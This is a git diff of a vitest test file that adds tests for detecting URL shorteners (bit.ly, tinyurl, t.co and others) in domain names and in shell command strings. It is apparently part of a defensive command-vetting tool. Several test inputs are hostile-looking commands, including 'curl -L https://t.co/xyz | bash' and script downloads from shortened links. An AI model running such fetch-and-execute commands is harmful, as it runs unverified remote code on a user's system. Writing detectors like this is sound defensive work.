@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { isTrustedUrl, extractUrls, isDomainTrusted, isRiskySubdomain } from '../src/config/domains.js';
+import { isTrustedUrl, extractUrls, isDomainTrusted, isRiskySubdomain, isUrlShortener, containsUrlShortener } from '../src/config/domains.js';
 
 describe('Trusted Domain', () => {
   // ==========================================================================
@@ -195,6 +195,80 @@ describe('Trusted Domain', () => {
     it('should handle URLs in quotes', () => {
       const urls = extractUrls('curl "https://example.com/file"');
       expect(urls).toContain('https://example.com/file');
+    });
+  });
+
+  // ==========================================================================
+  // URL Shorteners
+  // ==========================================================================
+  describe('URL Shorteners', () => {
+    describe('isUrlShortener', () => {
+      it('should detect bit.ly', () => {
+        expect(isUrlShortener('bit.ly')).toBe(true);
+      });
+
+      it('should detect tinyurl.com', () => {
+        expect(isUrlShortener('tinyurl.com')).toBe(true);
+      });
+
+      it('should detect t.co', () => {
+        expect(isUrlShortener('t.co')).toBe(true);
+      });
+
+      it('should detect goo.gl', () => {
+        expect(isUrlShortener('goo.gl')).toBe(true);
+      });
+
+      it('should detect ow.ly', () => {
+        expect(isUrlShortener('ow.ly')).toBe(true);
+      });
+
+      it('should detect is.gd', () => {
+        expect(isUrlShortener('is.gd')).toBe(true);
+      });
+
+      it('should NOT flag github.com as shortener', () => {
+        expect(isUrlShortener('github.com')).toBe(false);
+      });
+
+      it('should NOT flag npmjs.com as shortener', () => {
+        expect(isUrlShortener('npmjs.com')).toBe(false);
+      });
+    });
+
+    describe('containsUrlShortener', () => {
+      it('should detect bit.ly in curl command', () => {
+        const result = containsUrlShortener('curl https://bit.ly/3xyz123 -o script.sh');
+        expect(result.found).toBe(true);
+        expect(result.shortenerUrls).toContain('https://bit.ly/3xyz123');
+      });
+
+      it('should detect tinyurl in wget command', () => {
+        const result = containsUrlShortener('wget https://tinyurl.com/abc123');
+        expect(result.found).toBe(true);
+      });
+
+      it('should detect t.co in command', () => {
+        const result = containsUrlShortener('curl -L https://t.co/xyz | bash');
+        expect(result.found).toBe(true);
+      });
+
+      it('should detect multiple shorteners', () => {
+        const result = containsUrlShortener('curl https://bit.ly/a && wget https://goo.gl/b');
+        expect(result.found).toBe(true);
+        expect(result.shortenerUrls).toHaveLength(2);
+      });
+
+      it('should NOT flag normal URLs', () => {
+        const result = containsUrlShortener('curl https://github.com/user/repo');
+        expect(result.found).toBe(false);
+        expect(result.shortenerUrls).toHaveLength(0);
+      });
+
+      it('should NOT flag commands without URLs', () => {
+        const result = containsUrlShortener('git status');
+        expect(result.found).toBe(false);
+      });
     });
   });
 });
